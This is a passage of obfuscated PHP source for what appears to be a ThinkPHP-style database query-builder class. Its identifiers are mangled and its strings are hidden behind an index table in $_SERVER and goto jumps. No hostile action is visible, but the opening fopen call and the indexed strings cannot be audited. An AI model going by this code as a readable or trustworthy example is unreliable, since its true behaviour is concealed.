$a⁄ãÉË¥ÎÛ[876]; $b¯Ñà≤›Ü„ = fopen($F•«úÀ´Œ˘, $a⁄ãÉË¥ÎÛ[877]); goto CŸ∆Éº˘–Õ; fá‡÷õ’úÍ: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\75", "\156\145\x71" => "\x3c\x3e", "\x67\164" => "\76", "\x65\147\x74" => "\76\75", "\x6c\164" => "\74", "\145\x6c\164" => "\74\75", "\156\x6f\164\x6c\x69\153\145" => "\x4e\117\124\40\x4c\x49\113\105", "\x6c\151\x6b\145" => "\x4c\x49\113\105", "\151\x6e" => "\x49\116", "\156\x6f\164\x69\156" => "\116\x4f\x54\40\x49\116", "\x6e\x6f\x74\x20\151\156" => "\116\x4f\124\x20\x49\116", "\x62\x65\x74\167\145\x65\156" => "\102\105\124\127\x45\x45\x4e", "\x6e\x6f\x74\x62\x65\x74\x77\x65\145\x6e" => "\x4e\x4f\x54\x20\102\x45\124\x57\105\105\x4e", "\156\157\x74\x20\x62\145\164\167\145\x65\x6e" => "\x4e\117\124\x20\102\105\124\x57\x45\105\116"); protected $selectSql = "\x53\105\x4c\105\x43\124\45\104\x49\x53\x54\111\x4e\x43\124\45\x20\x25\106\x49\105\114\x44\45\x20\x46\x52\117\115\40\x25\124\101\102\114\105\45\45\x4a\x4f\x49\x4e\x25\45\x57\110\x45\x52\x45\x25\x25\x47\122\117\x55\120\x25\x25\x48\x41\126\111\x4e\107\45\x25\117\122\104\105\122\45\x25\x4c\x49\x4d\x49\124\x25\x20\x25\125\116\111\x4f\x4e\x25\x25\x43\117\115\115\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $DÑ⁄Ê“£ó’ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ä¿¡‡öóµŸﬂ‡][879], $DÑ⁄Ê“£ó’); } public function factory($f°‚˜àñ‚Ò = '') { goto fÊü¥»ô¯—; Aˆ¬—±É¯Ú: return $cäó∑ë∂Ò; goto f∏¥‚€§Ò; FÎå¥Ωú±Á: $this->dbType = ucwords(strtolower($f°‚˜àñ‚Ò[$AÕ·ÑÕ–Ã’[880]])); $aÏÊØÂµ…‚ = $AÕ·ÑÕ–Ã’[882] . $this->dbType; if (class_exists($aÏÊØÂµ…‚)) { $cäó∑ë∂Ò = new $aÏÊØÂµ…‚($f°‚˜àñ‚Ò); if ($AÕ·ÑÕ–Ã’[732] != strtolower($f°‚˜àñ‚Ò[$AÕ·ÑÕ–Ã’[880]])) { $cäó∑ë∂Ò->dbType = strtoupper($this->dbType); } else { $cäó∑ë∂Ò->dbType = $this->_getDsnType($f°‚˜àñ‚Ò[$AÕ·ÑÕ–Ã’[832]]); } } else { think_exception(think_lang($AÕ·ÑÕ–Ã’[883]) . $AÕ·ÑÕ–Ã’[884] . $aÏÊØÂµ…‚); } goto Aˆ¬—±É¯Ú; fÊü¥»ô¯—: $AÕ·ÑÕ–Ã’ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f°‚˜àñ‚Ò = $this->parseConfig($f°‚˜àñ‚Ò); if (empty($f°‚˜àñ‚Ò[$AÕ·ÑÕ–Ã’[880]])) { think_exception(think_lang($AÕ·ÑÕ–Ã’[881])); } goto FÎå¥Ωú±Á; f∏¥‚€§Ò: } public function __call($cñéœÕäÑ©, $b◊°ÿªå¯) { if (method_exists($this, $cñéœÕäÑ©)) { return call_user_func_array(array($this, $cñéœÕäÑ©), $b◊°ÿªå¯); } } protected function _getDsnType($CäÙ’ ãâ«) { $Eóîõ”Çñü = explode($_SERVER[Ä¿¡‡öóµŸﬂ‡][4], $CäÙ’ ãâ«); $B˘ïÜ—í∆≥ = strtoupper(trim($Eóîõ”Çñü[0])); return $B˘ïÜ—í∆≥; } private function parseConfig($b›Ã∞àÙÃõ = '') { $eéöäì…î =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!empty($b›Ã∞àÙÃõ) && is_string($b›Ã∞àÙÃõ)) { $b›Ã∞àÙÃõ = $this->parseDSN($b›Ã∞àÙÃõ); } elseif (is_array($b›Ã∞àÙÃõ)) { $b›Ã∞àÙÃõ = array_change_key_case($b›Ã∞àÙÃõ); $b›Ã∞àÙÃõ = array($eéöäì…î[880] => $b›Ã∞àÙÃõ[$eéöäì…î[731]], $eéöäì…î[805] => $b›Ã∞àÙÃõ[$eéöäì…î[885]], $eéöäì…î[806] => $b›Ã∞àÙÃõ[$eéöäì…î[886]], $eéöäì…î[803] => $b›Ã∞àÙÃõ[$eéöäì…î[887]], $eéöäì…î[804] => $b›Ã∞àÙÃõ[$eéöäì…î[888]], $eéöäì…î[17] => $b›Ã∞àÙÃõ[$eéöäì…î[889]], $eéöäì…î[832] => $b›Ã∞àÙÃõ[$eéöäì…î[733]], $eéöäì…î[13] => isset($b›Ã∞àÙÃõ[$eéöäì…î[890]]) ? $b›Ã∞àÙÃõ[$eéöäì…î[890]] : array()); } elseif (empty($b›Ã∞àÙÃõ)) { if (think_config($eéöäì…î[891]) && $eéöäì…î[732] != strtolower(think_config($eéöäì…î[892]))) { $b›Ã∞àÙÃõ = $this->parseDSN(think_config($eéöäì…î[891])); } else { $b›Ã∞àÙÃõ = array($eéöäì…î[880] => think_config($eéöäì…î[892]), $eéöäì…î[805] => think_config($eéöäì…î[893]), $eéöäì…î[806] => think_config($eéöäì…î[894]), $eéöäì…î[803] => think_config($eéöäì…î[895]), $eéöäì…î[804] => think_config($eéöäì…î[896]), $eéöäì…î[17] => think_config($eéöäì…î[234]), $eéöäì…î[832] => think_config($eéöäì…î[891]), $eéöäì…î[13] => think_config($eéöäì…î[897])); } } return $b›Ã∞àÙÃõ; } protected function initConnect($D˜“çïÔæâ = true) { if (1 == think_config($_SERVER[Ä¿¡‡öóµŸﬂ‡][18])) { $this->_linkID = $this->multiConnect($D˜“çïÔæâ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($A°ˆËû¬ˆ¯ = false) { $f£øΩ◊≠…ß =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; static $Cœ£¡ÿÿßå = array(); if (empty($Cœ£¡ÿÿßå)) { foreach ($this->config as $Bä∏ü©πÔæ => $B¡≥öòè¡Ç) { $Cœ£¡ÿÿßå[$Bä∏ü©πÔæ] = explode($f£øΩ◊≠…ß[47], $B¡≥öòè¡Ç); } } if (think_config($f£øΩ◊≠…ß[898])) { if ($A°ˆËû¬ˆ¯) { $aµŒƒ¨Õù¢ = floor(mt_rand(0, think_config($f£øΩ◊≠…ß[899]) - 1)); } else { if (is_numeric(think_config($f£øΩ◊≠…ß[900]))) { $aµŒƒ¨Õù¢ = think_config($f£øΩ◊≠…ß[900]); } else { $aµŒƒ¨Õù¢ = floor(mt_rand(think_config($f£øΩ◊≠…ß[899]), count($Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[803]]) - 1)); } } } else { $aµŒƒ¨Õù¢ = floor(mt_rand(0, count($Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[803]]) - 1)); } $DÀ≥ú´ﬁù§ = array($f£øΩ◊≠…ß[805] => isset($Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[805]][$aµŒƒ¨Õù¢]) ? $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[805]][$aµŒƒ¨Õù¢] : $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[805]][0], $f£øΩ◊≠…ß[806] => isset($Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[806]][$aµŒƒ¨Õù¢]) ? $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[806]][$aµŒƒ¨Õù¢] : $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[806]][0], $f£øΩ◊≠…ß[803] => isset($Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[803]][$aµŒƒ¨Õù¢]) ? $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[803]][$aµŒƒ¨Õù¢] : $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[803]][0], $f£øΩ◊≠…ß[804] => isset($Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[804]][$aµŒƒ¨Õù¢]) ? $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[804]][$aµŒƒ¨Õù¢] : $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[804]][0], $f£øΩ◊≠…ß[17] => isset($Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[17]][$aµŒƒ¨Õù¢]) ? $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[17]][$aµŒƒ¨Õù¢] : $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[17]][0], $f£øΩ◊≠…ß[832] => isset($Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[832]][$aµŒƒ¨Õù¢]) ? $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[832]][$aµŒƒ¨Õù¢] : $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[832]][0], $f£øΩ◊≠…ß[13] => isset($Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[13]][$aµŒƒ¨Õù¢]) ? $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[13]][$aµŒƒ¨Õù¢] : $Cœ£¡ÿÿßå[$f£øΩ◊≠…ß[13]][0]); return $this->connect($DÀ≥ú´ﬁù§, $aµŒƒ¨Õù¢); } public function parseDSN($däÔŒ◊É≥) { $dì’ßàÓñä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($däÔŒ◊É≥)) { return !1; } $aıè≥‰£⁄‘ = parse_url($däÔŒ◊É≥); if ($aıè≥‰£⁄‘[$dì’ßàÓñä[168]]) { $FÛ·≠∏—¿Ó = array($dì’ßàÓñä[880] => $aıè≥‰£⁄‘[$dì’ßàÓñä[168]], $dì’ßàÓñä[805] => isset($aıè≥‰£⁄‘[$dì’ßàÓñä[535]]) ? $aıè≥‰£⁄‘[$dì’ßàÓñä[535]] : $dì’ßàÓñä[33], $dì’ßàÓñä[806] => isset($aıè≥‰£⁄‘[$dì’ßàÓñä[901]]) ? $aıè≥‰£⁄‘[$dì’ßàÓñä[901]] : $dì’ßàÓñä[33], $dì’ßàÓñä[803] => isset($aıè≥‰£⁄‘[$dì’ßàÓñä[169]]) ? $aıè≥‰£⁄‘[$dì’ßàÓñä[169]] : $dì’ßàÓñä[33], $dì’ßàÓñä[804] => isset($aıè≥‰£⁄‘[$dì’ßàÓñä[170]]) ? $aıè≥‰£⁄‘[$dì’ßàÓñä[170]] : $dì’ßàÓñä[33], $dì’ßàÓñä[17] => isset($aıè≥‰£⁄‘[$dì’ßàÓñä[75]]) ? substr($aıè≥‰£⁄‘[$dì’ßàÓñä[75]], 1) : $dì’ßàÓñä[33]); } else { preg_match($dì’ßàÓñä[902], trim($däÔŒ◊É≥), $A™∞†îñ∞ç); $FÛ·≠∏—¿Ó = array($dì’ßàÓñä[880] => $A™∞†îñ∞ç[1], $dì’ßàÓñä[805] => $A™∞†îñ∞ç[2], $dì’ßàÓñä[806] => $A™∞†îñ∞ç[3], $dì’ßàÓñä[803] => $A™∞†îñ∞ç[4], $dì’ßàÓñä[804] => $A™∞†îñ∞ç[5], $dì’ßàÓñä[17] => $A™∞†îñ∞ç[6]); } $FÛ·≠∏—¿Ó[$dì’ßàÓñä[832]] = $dì’ßàÓñä[33]; return $FÛ·≠∏—¿Ó; } protected function debug() { $Bä±€πï¿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Bä±€πï¿[903]; if (think_config($Bä±€πï¿[904])) { think_status($Bä±€πï¿[905]); think_trace($this->queryStr . $Bä±€πï¿[906] . think_status($Bä±€πï¿[20], $Bä±€πï¿[905], 6) . $Bä±€πï¿[907], $Bä±€πï¿[33], $Bä±€πï¿[908]); } } protected function parseLock($Cª£å’Ãç¡ = false) { $dÛ≥˘∫û±‹ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$Cª£å’Ãç¡) { return $dÛ≥˘∫û±‹[33]; } if ($dÛ≥˘∫û±‹[834] == $this->dbType) { return $dÛ≥˘∫û±‹[909]; } return $dÛ≥˘∫û±‹[910]; } protected function parseSet($cÉÓâΩ‚÷¬) { $e‰≥à≥ÍŸ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; foreach ($cÉÓâΩ‚÷¬ as $CëãàÕÌíü => $Cà¬ÈÌÂÜŸ) { if (is_array($Cà¬ÈÌÂÜŸ) && $e‰≥à≥ÍŸ[285] == $Cà¬ÈÌÂÜŸ[0]) { $b°¶Ï·ìıÚ[] = $this->parseKey($CëãàÕÌíü) . $e‰≥à≥ÍŸ[911] . $Cà¬ÈÌÂÜŸ[1]; } elseif (is_scalar($Cà¬ÈÌÂÜŸ) || is_null($Cà¬ÈÌÂÜŸ)) { $b°¶Ï·ìıÚ[] = $this->parseKey($CëãàÕÌíü) . $e‰≥à≥ÍŸ[911] . $this->parseValue($Cà¬ÈÌÂÜŸ); } } return $e‰≥à≥ÍŸ[912] . implode($e‰≥à≥ÍŸ[47], $b°¶Ï·ìıÚ); } protected function bindParam($cÚ’ÉÃÎ∂â, $Cê§∆íç™˘) { $this->bind[$_SERVER[Ä¿¡‡öóµŸﬂ‡][4] . $cÚ’ÉÃÎ∂â] = $Cê§∆íç™˘; } protected function parseBind($BÉÃ¿ŸõÏ’) { $BÉÃ¿ŸõÏ’ = array_merge($this->bind, $BÉÃ¿ŸõÏ’); $this->bind = array(); return $BÉÃ¿ŸõÏ’; } function parseKey(&$B⁄Ñ≤»’è¬, $eÍ©õíµ‹∑ = true) { if ($eÍ©õíµ‹∑) { $B⁄Ñ≤»’è¬ = $this->parseKeyCheck($B⁄Ñ≤»’è¬); } return $B⁄Ñ≤»’è¬; } function parseKeyCheck($díï±Û‰éÓ) { $C®ÜÒ›ù˜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $díï±Û‰éÓ = trim($díï±Û‰éÓ); if (!preg_match($C®ÜÒ›ù˜[913], $díï±Û‰éÓ)) { think_exception($C®ÜÒ›ù˜[914] . $díï±Û‰éÓ); } return $díï±Û‰éÓ; } protected function parseValue($cçîãΩéÖ≤) { $dµÕíﬂó∞ù =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (is_string($cçîãΩéÖ≤)) { $cçîãΩéÖ≤ = $dµÕíﬂó∞ù[873] . $this->escapeString($cçîãΩéÖ≤) . $dµÕíﬂó∞ù[873]; } elseif (isset($cçîãΩéÖ≤[0]) && is_string($cçîãΩéÖ≤[0]) && strtolower($cçîãΩéÖ≤[0]) == $dµÕíﬂó∞ù[285]) { $cçîãΩéÖ≤ = $this->escapeString($cçîãΩéÖ≤[1]); } elseif (is_array($cçîãΩéÖ≤)) { $cçîãΩéÖ≤ = array_map(array($this, $dµÕíﬂó∞ù[874]), $cçîãΩéÖ≤); } elseif (is_bool($cçîãΩéÖ≤)) { $cçîãΩéÖ≤ = $cçîãΩéÖ≤ ? $dµÕíﬂó∞ù[83] : $dµÕíﬂó∞ù[468]; } elseif (is_null($cçîãΩéÖ≤)) { $cçîãΩéÖ≤ = $dµÕíﬂó∞ù[99]; } return $cçîãΩéÖ≤; } protected function parseField($AÉ™œﬂÇ‚€) { $açö“∞‹ﬂ† =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (is_string($AÉ™œﬂÇ‚€) && strpos($AÉ™œﬂÇ‚€, $açö“∞‹ﬂ†[47])) { $AÉ™œﬂÇ‚€ = explode($açö“∞‹ﬂ†[47], $AÉ™œﬂÇ‚€); } if (is_array($AÉ™œﬂÇ‚€)) { $dÊé®Ñ¨°∞ = array(); foreach ($AÉ™œﬂÇ‚€ as $Eå§ŸïùœÈ => $e⁄–ë˜¿‚º) { if (!is_numeric($Eå§ŸïùœÈ)) { $dÊé®Ñ¨°∞[] = $this->parseKey($Eå§ŸïùœÈ) . $açö“∞‹ﬂ†[915] . $this->parseKey($e⁄–ë˜¿‚º); } else { $dÊé®Ñ¨°∞[] = $this->parseKey($e⁄–ë˜¿‚º); } } $BóŒà≤£ëä = implode($açö“∞‹ﬂ†[47], $dÊé®Ñ¨°∞); } elseif (is_string($AÉ™œﬂÇ‚€) && !empty($AÉ™œﬂÇ‚€)) { $BóŒà≤£ëä = $AÉ™œﬂÇ‚€; } else { $BóŒà≤£ëä = $açö“∞‹ﬂ†[176]; } return $BóŒà≤£ëä; } protected function parseTable($eÔÑ™ãùÙ) { $FŒè≠ÍÔ•£ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (is_array($eÔÑ™ãùÙ)) { $Bô√ï¥ﬁ‘ñ = array(); foreach ($eÔÑ™ãùÙ as $c∞àüõ∂∆ª => $eéÎâñ„≤ï) { if (!is_numeric($c∞àüõ∂∆ª)) { $Bô√ï¥ﬁ‘ñ[] = $this->parseKey($c∞àüõ∂∆ª) . $FŒè≠ÍÔ•£[50] . $this->parseKey($eéÎâñ„≤ï); } else { $Bô√ï¥ﬁ‘ñ[] = $this->parseKey($c∞àüõ∂∆ª); } } $eÔÑ™ãùÙ = $Bô√ï¥ﬁ‘ñ; } elseif (is_string($eÔÑ™ãùÙ)) { if (strstr($eÔÑ™ãùÙ, $FŒè≠ÍÔ•£[50])) { return $eÔÑ™ãùÙ; } $eÔÑ™ãùÙ = explode($FŒè≠ÍÔ•£[47], $eÔÑ™ãùÙ); array_walk($eÔÑ™ãùÙ, array($this, $FŒè≠ÍÔ•£[822])); } return $FŒè≠ÍÔ•£[916] . trim(implode($FŒè≠ÍÔ•£[917], $eÔÑ™ãùÙ), $FŒè≠ÍÔ•£[828]) . $FŒè≠ÍÔ•£[916]; } protected function parseWhere($C£’Ö ÍÇ≈) { $Aô»ÀÍ‘∫œ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A€ŸâÈ€àÑ = $Aô»ÀÍ‘∫œ[33]; if (is_string($C£’Ö ÍÇ≈)) { $A€ŸâÈ€àÑ = $C£’Ö ÍÇ≈; } else { $D‚Óàêè‘ø = isset($C£’Ö ÍÇ≈[$Aô»ÀÍ‘∫œ[918]]) ? strtoupper($C£’Ö ÍÇ≈[$Aô»ÀÍ‘∫œ[918]]) : $Aô»ÀÍ‘∫œ[33]; if (in_array($D‚Óàêè‘ø, array($Aô»ÀÍ‘∫œ[919], $Aô»ÀÍ‘∫œ[920], $Aô»ÀÍ‘∫œ[921]))) { $D‚Óàêè‘ø = $Aô»ÀÍ‘∫œ[50] . $D‚Óàêè‘ø . $Aô»ÀÍ‘∫œ[50]; unset($C£’Ö ÍÇ≈[$Aô»ÀÍ‘∫œ[918]]); } else { $D‚Óàêè‘ø = $Aô»ÀÍ‘∫œ[922]; } foreach ($C£’Ö ÍÇ≈ as $cÕÓéÁ˜ÇÒ => $a•£ÈÌŸ„ë) { $A€ŸâÈ€àÑ .= $Aô»ÀÍ‘∫œ[265]; if (is_numeric($cÕÓéÁ˜ÇÒ)) { $cÕÓéÁ˜ÇÒ = $Aô»ÀÍ‘∫œ[923]; } if (0 === strpos($cÕÓéÁ˜ÇÒ, $Aô»ÀÍ‘∫œ[70])) { $A€ŸâÈ€àÑ .= $this->parseThinkWhere($cÕÓéÁ˜ÇÒ, $a•£ÈÌŸ„ë); } else { if (!preg_match($Aô»ÀÍ‘∫œ[924], trim($cÕÓéÁ˜ÇÒ))) { think_exception(think_lang($Aô»ÀÍ‘∫œ[925]) . $Aô»ÀÍ‘∫œ[4] . $cÕÓéÁ˜ÇÒ); } $eÃæ∂‹ãáÂ = is_array($a•£ÈÌŸ„ë) && isset($a•£ÈÌŸ„ë[$Aô»ÀÍ‘∫œ[926]]); $cÕÓéÁ˜ÇÒ = trim($cÕÓéÁ˜ÇÒ); if (strpos($cÕÓéÁ˜ÇÒ, $Aô»ÀÍ‘∫œ[271])) { $dîÂéÌÁî∑ = explode($Aô»ÀÍ‘∫œ[271], $cÕÓéÁ˜ÇÒ); $E”ôäÕØ∏» = array(); foreach ($dîÂéÌÁî∑ as $Eç∏áÏ¥àÆ => $dà˜à©â«Ñ) { $Aîñèœ⁄ÖÉ = $eÃæ∂‹ãáÂ ? $a•£ÈÌŸ„ë[$Eç∏áÏ¥àÆ] : $a•£ÈÌŸ„ë; $E”ôäÕØ∏»[] = $Aô»ÀÍ‘∫œ[248] . $this->parseWhereItem($this->parseKey($dà˜à©â«Ñ), $Aîñèœ⁄ÖÉ) . $Aô»ÀÍ‘∫œ[821]; } $A€ŸâÈ€àÑ .= implode($Aô»ÀÍ‘∫œ[927], $E”ôäÕØ∏»); } elseif (strpos($cÕÓéÁ˜ÇÒ, $Aô»ÀÍ‘∫œ[272])) { $dîÂéÌÁî∑ = explode($Aô»ÀÍ‘∫œ[272], $cÕÓéÁ˜ÇÒ); $E”ôäÕØ∏» = array(); foreach ($dîÂéÌÁî∑ as $Eç∏áÏ¥àÆ => $dà˜à©â«Ñ) { $Aîñèœ⁄ÖÉ = $eÃæ∂‹ãáÂ ? $a•£ÈÌŸ„ë[$Eç∏áÏ¥àÆ] : $a•£ÈÌŸ„ë; $E”ôäÕØ∏»[] = $Aô»ÀÍ‘∫œ[248] . $this->parseWhereItem($this->parseKey($dà˜à©â«Ñ), $Aîñèœ⁄ÖÉ) . $Aô»ÀÍ‘∫œ[821]; } $A€ŸâÈ€àÑ .= implode($Aô»ÀÍ‘∫œ[922], $E”ôäÕØ∏»); } else { $A€ŸâÈ€àÑ .= $this->parseWhereItem($this->parseKey($cÕÓéÁ˜ÇÒ), $a•£ÈÌŸ„ë); } } $A€ŸâÈ€àÑ .= $Aô»ÀÍ‘∫œ[266] . $D‚Óàêè‘ø; } $A€ŸâÈ€àÑ = substr($A€ŸâÈ€àÑ, 0, -strlen($D‚Óàêè‘ø)); } return empty($A€ŸâÈ€àÑ) ? $Aô»ÀÍ‘∫œ[33] : $Aô»ÀÍ‘∫œ[928] . $A€ŸâÈ€àÑ; } protected function parseWhereItem($AŸÜŸŒËàÈ, $bÛ´¥ãØ§Ó) { $F°ª ”–Ãç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f√™˜ìâÔ‡ = $F°ª ”–Ãç[33]; if (is_array($bÛ´¥ãØ§Ó)) { if (is_string($bÛ´¥ãØ§Ó[0])) { $f∫∫≥‰§çò = strtolower($bÛ´¥ãØ§Ó[0]); if (in_array($bÛ´¥ãØ§Ó[0], array($F°ª ”–Ãç[911], $F°ª ”–Ãç[929], $F°ª ”–Ãç[930], $F°ª ”–Ãç[931], $F°ª ”–Ãç[932], $F°ª ”–Ãç[933]))) { $f√™˜ìâÔ‡ .= $AŸÜŸŒËàÈ . $F°ª ”–Ãç[50] . $bÛ´¥ãØ§Ó[0] . $F°ª ”–Ãç[50] . $this->parseValue($bÛ´¥ãØ§Ó[1]); } elseif (preg_match($F°ª ”–Ãç[934], $bÛ´¥ãØ§Ó[0])) { $f√™˜ìâÔ‡ .= $AŸÜŸŒËàÈ . $F°ª ”–Ãç[50] . $this->exp[$f∫∫≥‰§çò] . $F°ª ”–Ãç[50] . $this->parseValue($bÛ´¥ãØ§Ó[1]); } elseif (preg_match($F°ª ”–Ãç[935], $bÛ´¥ãØ§Ó[0])) { if (is_array($bÛ´¥ãØ§Ó[1])) { $BŸ®íÌ¡«à = isset($bÛ´¥ãØ§Ó[2]) ? strtoupper($bÛ´¥ãØ§Ó[2]) : $F°ª ”–Ãç[920]; if (in_array($BŸ®íÌ¡«à, array($F°ª ”–Ãç[919], $F°ª ”–Ãç[920], $F°ª ”–Ãç[921]))) { $dÑıÂäÎµè = array(); foreach ($bÛ´¥ãØ§Ó[1] as $E¥òÍ›»äù) { $dÑıÂäÎµè[] = $AŸÜŸŒËàÈ . $F°ª ”–Ãç[50] . $this->exp[$f∫∫≥‰§çò] . $F°ª ”–Ãç[50] . $this->parseValue($E¥òÍ›»äù); } $f√™˜ìâÔ‡ .= $F°ª ”–Ãç[248] . implode($F°ª ”–Ãç[50] . $BŸ®íÌ¡«à . $F°ª ”–Ãç[50], $dÑıÂäÎµè) . $F°ª ”–Ãç[821]; } } else { $f√™˜ìâÔ‡ .= $AŸÜŸŒËàÈ . $F°ª ”–Ãç[50] . $this->exp[$f∫∫≥‰§çò] . $F°ª ”–Ãç[50] . $this->parseValue($bÛ´¥ãØ§Ó[1]); } } elseif ($F°ª ”–Ãç[285] == $f∫∫≥‰§çò) { $f√™˜ìâÔ‡ .= $F°ª ”–Ãç[819] . $AŸÜŸŒËàÈ . $F°ª ”–Ãç[50] . $bÛ´¥ãØ§Ó[1] . $F°ª ”–Ãç[936]; } elseif (preg_match($F°ª ”–Ãç[937], $bÛ´¥ãØ§Ó[0])) { if (isset($bÛ´¥ãØ§Ó[2]) && $F°ª ”–Ãç[285] == $bÛ´¥ãØ§Ó[2]) { $f√™˜ìâÔ‡ .= $AŸÜŸŒËàÈ . $F°ª ”–Ãç[50] . $this->exp[$f∫∫≥‰§çò] . $F°ª ”–Ãç[50] . $bÛ´¥ãØ§Ó[1]; } else { if (is_string($bÛ´¥ãØ§Ó[1])) { $bÛ´¥ãØ§Ó[1] = explode($F°ª ”–Ãç[47], $bÛ´¥ãØ§Ó[1]); } $A∫ﬁÔÿÌéô = implode($F°ª ”–Ãç[47], $this->parseValue($bÛ´¥ãØ§Ó[1])); $f√™˜ìâÔ‡ .= $AŸÜŸŒËàÈ . $F°ª ”–Ãç[50] . $this->exp[$f∫∫≥‰§çò] . $F°ª ”–Ãç[819] . $A∫ﬁÔÿÌéô . $F°ª ”–Ãç[821]; } } elseif (preg_match($F°ª ”–Ãç[938], $bÛ´¥ãØ§Ó[0])) { $cÜÈ¶º˘‰‹ = is_string($bÛ´¥ãØ§Ó[1]) ? explode($F°ª ”–Ãç[47], $bÛ´¥ãØ§Ó[1]) : $bÛ´¥ãØ§Ó[1]; $f√™˜ìâÔ‡ .= $F°ª ”–Ãç[819] . $AŸÜŸŒËàÈ . $F°ª ”–Ãç[50] . $this->exp[$f∫∫≥‰§çò] . $F°ª ”–Ãç[50] . $this->parseValue($cÜÈ¶º˘‰‹[0]) . $F°ª ”–Ãç[922] . $this->parseValue($cÜÈ¶º˘‰‹[1]) . $F°ª ”–Ãç[266]; } else { think_exception(think_lang($F°ª ”–Ãç[925]) . $F°ª ”–Ãç[4] . $bÛ´¥ãØ§Ó[0]); } } else { $eªæèÑŒÑœ = count($bÛ´¥ãØ§Ó); $d≤Í¡„ˆéÁ = isset($bÛ´¥ãØ§Ó[$eªæèÑŒÑœ - 1]) ? strtoupper($bÛ´¥ãØ§Ó[$eªæèÑŒÑœ - 1]) : $F°ª ”–Ãç[33]; if (in_array($d≤Í¡„ˆéÁ, array($F°ª ”–Ãç[919], $F°ª ”–Ãç[920], $F°ª ”–Ãç[921]))) { $eªæèÑŒÑœ = $eªæèÑŒÑœ - 1; } else { $d≤Í¡„ˆéÁ = $F°ª ”–Ãç[919]; } for ($Eﬂíéò’§ô = 0; $Eﬂíéò’§ô < $eªæèÑŒÑœ; $Eﬂíéò’§ô++) { $cÜÈ¶º˘‰‹ = is_array($bÛ´¥ãØ§Ó[$Eﬂíéò’§ô]) ? $bÛ´¥ãØ§Ó[$Eﬂíéò’§ô][1] : $bÛ´¥ãØ§Ó[$Eﬂíéò’§ô]; if ($F°ª ”–Ãç[285] == strtolower($bÛ´¥ãØ§Ó[$Eﬂíéò’§ô][0])) { $f√™˜ìâÔ‡ .= $F°ª ”–Ãç[248] . $AŸÜŸŒËàÈ . $F°ª ”–Ãç[50] . $cÜÈ¶º˘‰‹ . $F°ª ”–Ãç[936] . $d≤Í¡„ˆéÁ . $F°ª ”–Ãç[50]; } else { $DÃìªë∏àå = is_array($bÛ´¥ãØ§Ó[$Eﬂíéò’§ô]) ? $this->exp[strtolower($bÛ´¥ãØ§Ó[$Eﬂíéò’§ô][0])] : $F°ª ”–Ãç[911]; if (!$DÃìªë∏àå && is_array($bÛ´¥ãØ§Ó[$Eﬂíéò’§ô]) && in_array($bÛ´¥ãØ§Ó[$Eﬂíéò’§ô][0], array($F°ª ”–Ãç[911], $F°ª ”–Ãç[929], $F°ª ”–Ãç[930], $F°ª ”–Ãç[931], $F°ª ”–Ãç[932], $F°ª ”–Ãç[933]))) { $DÃìªë∏àå = $bÛ´¥ãØ§Ó[$Eﬂíéò’§ô][0]; } $f√™˜ìâÔ‡ .= $F°ª ”–Ãç[248] . $AŸÜŸŒËàÈ . $F°ª ”–Ãç[50] . $DÃìªë∏àå . $F°ª ”–Ãç[50] . $this->parseValue($cÜÈ¶º˘‰‹) . $F°ª ”–Ãç[936] . $d≤Í¡„ˆéÁ . $F°ª ”–Ãç[50]; } } $f√™˜ìâÔ‡ = substr($f√™˜ìâÔ‡, 0, -4); } } else { $f√™˜ìâÔ‡ .= $AŸÜŸŒËàÈ . $F°ª ”–Ãç[939] . $this->parseValue($bÛ´¥ãØ§Ó); } return $f√™˜ìâÔ‡; } protected function parseThinkWhere($f—øçæÌı•, $e≤Ë¬ìÊøî) { $B∞èÉÈ§ù =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c∫âçïï“â = $B∞èÉÈ§ù[33]; switch ($f—øçæÌı•) { case $B∞èÉÈ§ù[339]: $c∫âçïï“â = $e≤Ë¬ìÊøî; break; case $B∞èÉÈ§ù[923]: $c∫âçïï“â = is_string($e≤Ë¬ìÊøî) ? $e≤Ë¬ìÊøî : 